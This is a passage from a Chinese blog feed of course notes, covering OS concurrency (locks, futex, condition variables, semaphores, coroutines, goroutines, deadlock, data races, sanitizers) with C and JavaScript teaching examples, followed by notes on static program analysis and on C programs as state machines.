(线程)<ul><li>成功获得手环，进入游泳馆</li><li><code>*lk = 🔒</code>，系统调用直接返回</li></ul></li><li>后到的人 (线程)<ul><li>不能进入游泳馆，排队等待</li><li>线程放入等待队列，执行线程切换 (yield)</li></ul></li><li>洗完澡出来的人 (线程)<ul><li>交还手环给管理员；管理员把手环再交给排队的人</li><li>如果等待队列不空，从等待队列中取出一个线程允许执行</li><li>如果等待队列为空，<code>*lk = ✅</code></li></ul></li><li>管理员 (OS) 使用自旋锁确保自己处理手环的过程是原子的</li></ul><h2 id="自旋锁·睡眠锁分析"><a class="header-anchor" href="#自旋锁·睡眠锁分析">¶</a>自旋锁·睡眠锁分析</h2><p>自旋锁 (线程直接共享 locked)</p><ul><li>更快的 fast path<ul><li>xchg 成功 → 立即进入临界区，开销很小</li></ul></li><li>更慢的 slow path<ul><li>xchg 失败 → 浪费 CPU 自旋等待</li></ul></li></ul><p>在多处理器情况下，没有对锁的争用，也就是只有一个线程想获得锁，那么明显自旋锁更快，通过一条<code>xchg</code>原子指令就能获得/释放锁；如果出现了锁的争用，拥堵的越严重，自旋锁的性能就越差。</p><hr><p>睡眠锁 (通过系统调用访问 locked)</p><ul><li>更快的 slow path<ul><li>上锁失败线程不再占用 CPU</li></ul></li><li>更慢的 fast path<ul><li>即便上锁成功也需要进出内核 (syscall)</li><li>系统调用涉及到特权级的切换，页表的切换，栈指针的切换，etc. 系统调用这件事本身的开销就不小</li></ul></li></ul><h2 id="Futex-Fast-Userspace-muTexes"><a class="header-anchor" href="#Futex-Fast-Userspace-muTexes">¶</a>Futex: Fast Userspace muTexes</h2><ul><li>Fast path: 一条原子指令，上锁成功立即返回</li><li>Slow path: 上锁失败，执行系统调用睡眠</li></ul><h1>同步</h1><p>线程同步：在某个时间点共同达到互相已知的状态</p><h2 id="生产者-消费者问题"><a class="header-anchor" href="#生产者-消费者问题">¶</a>生产者-消费者问题</h2><p>并发软件开发场景中，有相当大一部分的并发问题本质上就是生产者-消费者问题。</p><p>概述如下：有一个buffer，它的大小是固定的，此时系统中有两种类型的线程；</p><ul><li>生产者（producer），往buffer里丢东西</li><li>消费者（consumer），从buffer里取东西</li></ul><p>因为buffer有大小限制，所以不能往里面丢太多东西，因此生产者在buffer满的时候就不能向其中再填入数据了，需要开始等待；当buffer空的时候，消费者也自然不会消费，因此也需要开始等待。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tproduce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == n) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tconsume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">retry:</span><br><span class="line">    mutex_lock(&amp;lk);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">      mutex_unlock(&amp;lk);</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    mutex_unlock(&amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用互斥锁保持条件成立，但它还是有一个自旋的循环，尽管<code>lock</code>中不一定spin，但while循环做的事情就是spin，可以说是&quot;spin on the buffer&quot;</p><h2 id="条件变量：万能同步方法"><a class="header-anchor" href="#条件变量：万能同步方法">¶</a>条件变量：万能同步方法</h2><p>条件变量的设计，其实就是“锁+条件”</p><p>把上文代码中的自旋变成睡眠，在完成操作时唤醒</p><h3 id="条件变量-API"><a class="header-anchor" href="#条件变量-API">¶</a>条件变量 API</h3><ul><li><p>wait(cv, mutex) 💤</p><ul><li>调用时必须保证已经获得 mutex</li><li>释放 mutex、进入睡眠状态</li></ul><hr><p><code>wait(fn)</code>这种，该api会一直监控<code>fn</code>，频繁地调用它，看它满足不满足条件，其内部实现可以是<code>while(!fn());</code>这样，所以看起来我们就可以保证“<code>wait</code>返回之后，<code>fn</code>对应的条件就成立了”。</p><p>实则不然，这只能保证<code>fn</code>被调用的时候条件成立，但系统是并发的（可能有好几百个生产者/消费者），<code>fn</code>返回的时候也许条件就不再成立了，因此api不能这样设计。</p><p>我们希望的是<code>wait</code>返回之后，相应的条件会在一段时间里持续地被满足，因此可以借助锁使得条件持续地被满足。<strong>条件变量的设计，其实就是“锁+条件”</strong></p><p>因此，<code>wait</code>函数内部要做的事情就是：当发现条件不满足时进入睡眠，并且释放锁，等到条件满足时线程被唤醒，并且再次获得锁，从而在保持条件一直被满足，直到锁被释放。</p><hr></li><li><p>signal/notify(cv) 💬 私信：走起</p><ul><li>如果有线程正在等待 cv，则唤醒其中一个线程</li></ul></li><li><p>broadcast/notifyAll(cv) 📣 所有人：走起</p><ul><li>唤醒全部正在等待 cv 的线程</li></ul></li></ul><p>具体的代码框架如下，<code>cond</code>是我们要等待的条件。如果我们知道每个线程在等什么，并且能够知道其他的线程在什么时候可以让这个线程所等待的事情成立，就可以套用如下的框架去解决同步问题</p><ul><li><p>需要等待条件满足时</p><p><code>mutex_lock(&amp;mutex); while (!cond) &#123;   wait(&amp;cv, &amp;mutex); &#125; assert(cond); // ... // 互斥锁保证了在此期间条件 cond 总是成立 // ... mutex_unlock(&amp;mutex);</code></p></li><li><p>其他线程条件可能被满足时</p><p><code>broadcast(&amp;cv);</code></p></li></ul><h3 id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h3><p>有三种线程，分别打印 <code>&lt;</code>, <code>&gt;</code>, 和 <code>_</code></p><ul><li>对这些线程进行同步，使得打印出的序列总是 <code>&lt;&gt;&lt;_</code> 和 <code>&gt;&lt;&gt;_</code> 组合</li></ul><hr><p>使用条件变量，实现多个打印线程之间的同步，那么就需要分析出：每个线程得以继续向前执行时需要满足什么条件？</p><p>也就是只要回答三个问题：</p><ul><li>打印 “<code>&lt;</code>” 的条件？</li><li>打印 “<code>&gt;</code>” 的条件？</li><li>打印 “<code>_</code>” 的条件？</li></ul><p>给我们期望中的系统构建一个状态机</p><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20220912192044.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> &#123;</span></span><br><span class="line">  A = <span class="number">1</span>, B, C, D, E, F,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">from</span>;</span></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">to</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rule</span> <span class="title">rules</span>[] =</span> &#123;</span><br><span class="line">  &#123; A, <span class="string">&#x27;&lt;&#x27;</span>, B &#125;,</span><br><span class="line">  &#123; B, <span class="string">&#x27;&gt;&#x27;</span>, C &#125;,</span><br><span class="line">  &#123; C, <span class="string">&#x27;&lt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; A, <span class="string">&#x27;&gt;&#x27;</span>, E &#125;,</span><br><span class="line">  &#123; E, <span class="string">&#x27;&lt;&#x27;</span>, F &#125;,</span><br><span class="line">  &#123; F, <span class="string">&#x27;&gt;&#x27;</span>, D &#125;,</span><br><span class="line">  &#123; D, <span class="string">&#x27;_&#x27;</span>, A &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">current</span> =</span> A;</span><br><span class="line"><span class="keyword">int</span> quota = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> lk   = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="keyword">pthread_cond_t</span>  cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">next</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LENGTH(rules); i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> *<span class="title">rule</span> =</span> &amp;rules[i];</span><br><span class="line">    <span class="keyword">if</span> (rule-&gt;from == current &amp;&amp; rule-&gt;ch == ch) &#123;</span><br><span class="line">      <span class="keyword">return</span> rule-&gt;to;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_before</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  <span class="keyword">while</span> (next(ch) == <span class="number">0</span> || quota == <span class="number">0</span>) &#123;</span><br><span class="line">    pthread_cond_wait(&amp;cond, &amp;lk);</span><br><span class="line">  &#125;</span><br><span class="line">  quota--;</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_after</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">  pthread_mutex_lock(&amp;lk);</span><br><span class="line">  quota++;</span><br><span class="line">  current = next(ch);</span><br><span class="line">  assert(current);</span><br><span class="line">  pthread_cond_broadcast(&amp;cond);</span><br><span class="line">  pthread_mutex_unlock(&amp;lk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_init</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> roles[] = <span class="string">&quot;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;___&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fish_thread</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> role = roles[id];</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    fish_before(role);</span><br><span class="line">    <span class="built_in">putchar</span>(role); <span class="comment">// should not hold *any* mutex lock now</span></span><br><span class="line">    fish_after(role);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  fish_init();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(roles); i++)</span><br><span class="line">    create(fish_thread);</span><br><span class="line">  join(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>信号量（semaphore）</h1><p>信号量的工作机制，可以直接理解成计数器（当然其实加锁的时候肯定不能这么简单，不只只是信号量了），信号量会有初值（&gt;0），每当有进程申请使用信号量，通过一个P操作来对信号量进行-1操作，当计数器减到0的时候就说明没有资源了，其他进程要想访问就必须等待（具体怎么等还有说法，比如忙等待或者睡眠），当该进程执行完这段工作（我们称之为临界区）之后，就会执行V操作来对信号量进行+1操作。</p><p><strong>临界区</strong>：临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问的特性。</p><p><strong>临界资源</strong>：只能被一个进程同时使用（不可以多个进程共享），要用到互斥。</p><p>信号量也是进程间通信的一种方式，比如互斥锁的简单实现就是信号量，一个进程使用互斥锁，并通知（通信）其他想要该互斥锁的进程，阻止他们的访问和使用。</p><h3 id="行为建模"><a class="header-anchor" href="#行为建模">¶</a>行为建模</h3><p>Dijkstra提出，故术语PV操作出自荷兰文</p><ul><li>P(&amp;sem) - prolaag = try + decrease; wait; down; in<ul><li>等待一个手环后返回</li><li>如果此时管理员手上有空闲的手环，立即返回</li></ul></li><li>V(&amp;sem) - verhoog = increase; post; up; out<ul><li>变出一个手环，送给管理员</li></ul></li></ul><p>当有进程要求使用共享资源时，需要执行以下操作：</p><p>1.系统首先要检测该资源的信号量；</p><p>2.若该资源的信号量值大于0，则进程可以使用该资源，此时，进程将该资源的信号量值减1；</p><p>3.若该资源的信号量值为0，则进程进入休眠状态，直到信号量值大于0时进程被唤醒，访问该资源；</p><p>当进程不再使用由一个信号量控制的共享资源时，该信号量值增加1（V），如果此时有进程处于休眠状态等待此信号量，则该进程会被唤醒。</p><h1>现代编程语言中的并发模型</h1><h2 id="协程（coroutines）"><a class="header-anchor" href="#协程（coroutines）">¶</a>协程（coroutines）</h2><ul><li>多个可以保存/恢复的执行流</li><li>比线程更轻量 (完全没有系统调用，也就没有操作系统状态)</li></ul><p>在一个没有多线程的程序里面，创建出若干个好像线程的东西。<code>co_start(fn)</code>会在内存中创建一个执行流<code>fn</code>，但是系统当中还是只有一个执行流在执行：先是一直执行<code>main</code>的代码，直至执行<code>co_yield()</code>，暂停当前的执行流，然后切换到另外一个执行流，该执行流从<code>fn</code>开始执行，<code>fn</code>执行完了之后会再次执行<code>co_yield</code>，就会回到之前的执行流去执行。</p><p>协程和线程相比，坏处是无法使用多个CPU，无并行可言。<br>好处是，如果我们希望函数执行的时候帮我们算一个东西出来，并且执行流离开它时函数的状态可以得到保存，下一次执行流再切换回这个函数的时候它可以给我们计算出下一个东西，那么就可以使用协程来完成，Python的Generator就是这样的协程。</p><h2 id="数据中心：协程和线程"><a class="header-anchor" href="#数据中心：协程和线程">¶</a>数据中心：协程和线程</h2><p>数据中心</p><ul><li>同一时间有数千/数万个请求到达服务器</li><li>计算部分<ul><li>需要利用好多处理器<ul><li>线程 → 这就是我擅长的</li><li>协程 → 一人出力，他人摸鱼</li></ul></li></ul></li><li>I/O 部分<ul><li>会在系统调用上 block (例如请求另一个服务或读磁盘)<ul><li>协程 → 一人干等，他人围观</li><li>线程 → 每个线程都占用可观的操作系统资源</li></ul></li></ul></li></ul><h2 id="Go和Goroutine"><a class="header-anchor" href="#Go和Goroutine">¶</a>Go和Goroutine</h2><p>面对协程和线程各自的问题，Goroutine应运而生，使用Go目前也成为了后端开发的趋势，兼顾多处理器并行和轻量级并发。</p><p>Goroutine: 概念上是线程，实际是线程和协程的混合体</p><ul><li><p>在每个CPU上都放一个线程，每个 CPU 上有一个 Go Worker，自由调度 Goroutines。两个CPU上的Goroutine可以是真正并行的。任何时刻单个CPU上只会有一个Goroutine运行。</p></li><li><p>执行到 blocking API 时 (例如 sleep, read)</p><p>Go Worker 偷偷改成 non-blocking 的版本：要执行<code>read</code>的时候，<code>read()</code>都会被替换成<code>tryread()</code></p><ul><li><code>tryread()</code>成功 → 立即继续执行Goroutine</li><li><code>tryread()</code>失败 → 立即 yield 到另一个需要 CPU 的 Goroutine，操作系统会提供相关的api使得它可以在条件合适的时候被唤醒。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/StantonJoY/ImgStorage/main/20220914001607.png" alt></p><p>太巧妙了！CPU 和操作系统全部用到 100%</p><h1>身边的并发：Web 2.0</h1><p>是什么成就了今天的 Web 2.0 ？</p><ul><li>浏览器中的并发编程：Ajax (Asynchronous JavaScript + XML)</li><li>HTML (DOM Tree) + CSS 代表了你能看见的一切<ul><li>通过 JavaScript 可以改变它</li><li>通过 JavaScript 可以建立连接本地和服务器</li></ul></li></ul><h2 id="单线程-事件模型"><a class="header-anchor" href="#单线程-事件模型">¶</a>单线程 + 事件模型</h2><p>我们需要的是尽可能少但又足够的并发。</p><ul><li>一个线程、全局的事件队列、按序执行 (run-to-complete)</li><li>耗时的 API (Timer, Ajax, …) 调用会立即返回（网络请求和结果操作一定不是同一个事件，而是将不同的响应操作加入事件队列）<ul><li>条件满足时向队列里增加一个事件</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax( &#123; <span class="attr">url</span>: <span class="string">&#x27;https://xxx.yyy.zzz/login&#x27;</span>,</span><br><span class="line">  <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">    $.ajax( &#123; <span class="attr">url</span>: <span class="string">&#x27;https://xxx.yyy.zzz/cart&#x27;</span>,</span><br><span class="line">      <span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">req, status, err</span>) </span>&#123; ... &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params">req, status, err</span>) </span>&#123; ... &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="异步事件模型"><a class="header-anchor" href="#异步事件模型">¶</a>异步事件模型</h2><p>好处</p><ul><li>并发模型简单了很多<ul><li>函数的执行是原子的 (不能并行，减少了并发 bug 的可能性)</li></ul></li><li>API 依然可以并行<ul><li>适合网页这种 “大部分时间花在渲染和网络请求” 的场景<ul><li>JavaScript 代码只负责 “描述” DOM Tree</li></ul></li></ul></li></ul><p>坏处</p><ul><li>Callback hell (祖传屎山)<ul><li>刚才的代码嵌套 5 层，可维护性已经接近于零了</li></ul></li></ul><p>导致 callback hell 的本质：人类脑袋里想的是 “流程图”，看到的是 “回调”。解决：Promise</p><h1>并发bug</h1><h2 id="死锁（Deadlock）"><a class="header-anchor" href="#死锁（Deadlock）">¶</a>死锁（Deadlock）</h2><h3 id="死锁产生的四个必要条件："><a class="header-anchor" href="#死锁产生的四个必要条件：">¶</a>死锁产生的四个必要条件：</h3><ul><li>互斥：一个资源每次只能被一个进程使用</li><li>请求与保持：一个进程请求资阻塞时，不释放已获得的资源</li><li>不剥夺：进程已获得的资源不能强行剥夺</li><li>循环等待：若干进程之间形成头尾相接的循环等待资源关系</li></ul><h3 id="避免死锁"><a class="header-anchor" href="#避免死锁">¶</a>避免死锁</h3><ul><li>任意时刻系统中的锁都是有限的</li><li>严格按照固定的顺序获得所有锁，消除 “循环等待”</li></ul><h2 id="数据竞争（Data-Race）"><a class="header-anchor" href="#数据竞争（Data-Race）">¶</a>数据竞争（Data Race）</h2><p>不同的线程同时访问同一段内存，且至少有一个是写。</p><p>两个内存访问在 “赛跑”，“跑赢” 的操作先执行（如peterson算法）</p><h3 id="解决"><a class="header-anchor" href="#解决">¶</a>解决</h3><p><strong>用互斥锁保护好共享数据，消灭一切数据竞争</strong></p><h3 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h3><p>数据竞争相关典型的两种bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Case #1: 上错了锁（各上个的）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread1</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk1); sum++; spin_unlock(&amp;lk1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread2</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk2); sum++; spin_unlock(&amp;lk2); &#125;</span><br><span class="line"><span class="comment">// Case #2: 忘记上锁</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread1</span><span class="params">()</span> </span>&#123; spin_lock(&amp;lk1); sum++; spin_unlock(&amp;lk1); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thread2</span><span class="params">()</span> </span>&#123; sum++; &#125;</span><br></pre></td></tr></table></figure><h2 id="动态分析工具：Sanitizers"><a class="header-anchor" href="#动态分析工具：Sanitizers">¶</a>动态分析工具：Sanitizers</h2><ul><li><a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer</a> (asan); <a href="https://www.usenix.org/conference/atc12/technical-sessions/presentation/serebryany">(paper)</a>: 非法内存访问<ul><li>Buffer (heap/stack/global) overflow, use-after-free, use-after-return, double-free, …</li><li>Demo: <a href="http://jyywiki.cn/pages/OS/2022/demos/uaf.c">uaf.c</a>; <a href="https://www.kernel.org/doc/html/latest/dev-tools/kasan.html">kasan</a></li></ul></li><li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">ThreadSanitizer</a> (tsan): 数据竞争<ul><li>Demo: <a href="http://jyywiki.cn/pages/OS/2022/demos/fish.c">fish.c</a>, <a href="http://jyywiki.cn/pages/OS/2022/demos/sum.c">sum.c</a>, <a href="http://jyywiki.cn/pages/OS/2022/demos/peterson-barrier.c">peterson-barrier.c</a>; <a href="https://github.com/google/ktsan">ktsan</a></li></ul></li><li><a href="https://clang.llvm.org/docs/MemorySanitizer.html">MemorySanitizer</a> (msan): 未初始化的读取</li><li><a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">UBSanitizer</a> (ubsan): undefined behavior<ul><li>Misaligned pointer, signed integer overflow, …</li><li>Kernel 会带着 <code>-fwrapv</code> 编译</li></ul></li></ul><h2 id="防御性编程"><a class="header-anchor" href="#防御性编程">¶</a>防御性编程</h2><p>Canary (金丝雀) 对一氧化碳非常敏感，被用于预警矿井下的瓦斯泄露。计算机系统中也有 canary，“牺牲” 一些内存单元，来预警 memory error 的发生。即在栈的高地址低地址两端都留出缓冲区。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-01</title>
      <link href="/2022/09/08/SPA-01/"/>
      <url>/2022/09/08/SPA-01/</url>
      
        <content type="html"><![CDATA[<p>由于现代程序的日渐复杂大规模，，程序的可靠性也需要理论支持。程序分析成为PL（Programming Language）领域最有活力的方向之一，在程序可靠性、程序安全、编译器优化、程序理解等方面有着很多应用。</p><h1>静态分析</h1><p>静态分析在运行一个程序之前，分析它的行为以及判断是否满足一些属性。</p><h2 id="Rice’s-Theorem"><a class="header-anchor" href="#Rice’s-Theorem">¶</a>Rice’s Theorem</h2><p>“Any non-trivial property of the behavior of programs in a r.e. language is undecidable.（递归可枚举语言的任何非平凡的性质，都是不可判定的。）</p><blockquote><p>r.e. (recursively enumerable) = recognizable by a Turing-machine</p><p>trivial properties 所有程序都有或都没有的性质<br>non-trivial properties</p><p>~= interesting properties<br>~= the properties related with run-time behaviors of program，如内存泄漏，可优化性</p></blockquote><h3 id="Perfect-static-analysis不存在"><a class="header-anchor" href="#Perfect-static-analysis不存在">¶</a>Perfect static analysis不存在</h3><p>Perfect：Sound AND Complete</p><p><img src="https://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/image-20200802115612020.png" alt></p><h2 id="Necessity-of-Soundness"><a class="header-anchor" href="#Necessity-of-Soundness">¶</a>Necessity of Soundness</h2><p>当程序可能出现bug时，我们都应该能够报告错误，即使某些路径上程序可能是正确的</p><p><strong>ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed</strong></p><h2 id="Abstraction-and-Over-approximation"><a class="header-anchor" href="#Abstraction-and-Over-approximation">¶</a>Abstraction and Over-approximation</h2>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-1</title>
      <link href="/2022/09/07/jyyOS-1/"/>
      <url>/2022/09/07/jyyOS-1/</url>
      
        <content type="html"><![CDATA[<h1>源代码程序是状态机</h1><ul><li>状态 = 堆 + 栈</li><li>初始状态 = <code>main</code> 的第一条语句</li><li>迁移 = 执行一条简单语句<ul><li>任何 C 程序都可以改写成 “非复合语句” 的 C 代码</li></ul></li></ul><h2 id="C程序的语义"><a class="header-anchor" href="#C程序的语义">¶</a>C程序的语义</h2><ul><li>状态 = stack frame 的列表 (每个 frame 有 PC) + 全局变量</li><li>初始状态 = main(argc, argv), 全局变量初始化</li><li>迁移 = 执行 top stack frame PC 的语句; PC++<ul><li>函数调用 = push frame (frame.PC = 入口)</li><li>函数返回 = pop frame</li></ul></li></ul><p>非递归汉诺塔：switch模拟状态机，把不同状态的frame放入call中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  u32 pc, n;</span><br><span class="line">  <span class="keyword">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> from, <span class="keyword">char</span> to, <span class="keyword">char</span> via)</span> </span>&#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span 